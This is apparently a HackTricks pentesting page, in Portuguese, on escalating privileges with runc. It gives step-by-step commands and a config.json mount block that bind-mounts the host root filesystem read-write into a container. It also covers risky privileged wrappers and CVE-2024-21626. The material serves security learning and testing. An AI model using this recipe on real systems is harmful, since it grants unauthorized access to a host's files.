# Escalação de privilégios do RunC

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Se quiser saber mais sobre **runc**, confira a página a seguir:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se `runc` estiver disponível para um processo rootful no host, você pode usar um bundle OCI cuja configuração de montagem faça bind mount recursivo do `/` do host em `/` dentro do container, expondo o sistema de arquivos do host nesse namespace de montagem.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> O fluxo de trabalho documentado de `runc run` é rootful: os próprios exemplos do runc o identificam como "run as root". Um usuário sem privilégios precisa de uma configuração rootless, como `runc spec --rootless`, e o runc documenta que os user namespaces precisam estar habilitados para esse modo.<sup>[[1]](#references)</sup>

## Wrappers privilegiados e versões do runtime

Um wrapper privilegiado que aceita um bundle OCI controlado pelo chamador pode expor arquivos do host se permitir bind mounts inseguros. Verifique se o wrapper resolve traversal e symlinks antes de validar as origens e os destinos dos mounts, e se restringe `process.cwd`. Uma regra do sudo ou um `config.json` gravável, por si só, não prova que o wrapper aceitará o bundle ou o executará com privilégios de host.

Separadamente, a [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) afetou as versões upstream do `runc` de `1.0.0-rc93` até `1.1.11`; a versão `1.1.12` contém a correção upstream. File descriptors vazados e validação insuficiente do diretório de trabalho podiam fazer com que um processo de container ficasse fora do seu root durante determinados fluxos de trabalho de `runc run` ou `runc exec`. Os números dos file descriptors dependem da invocação, e uma string de versão não comprova a possibilidade de exploração quando um fornecedor fez backport das correções ou quando o chamador não pode influenciar uma invocação privilegiada do runtime.

## References

- [1] [runc: ferramenta CLI para iniciar e executar containers](https://github.com/opencontainers/runc#using-runc)
- [2] [Especificação OCI de Runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Subárvores compartilhadas](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
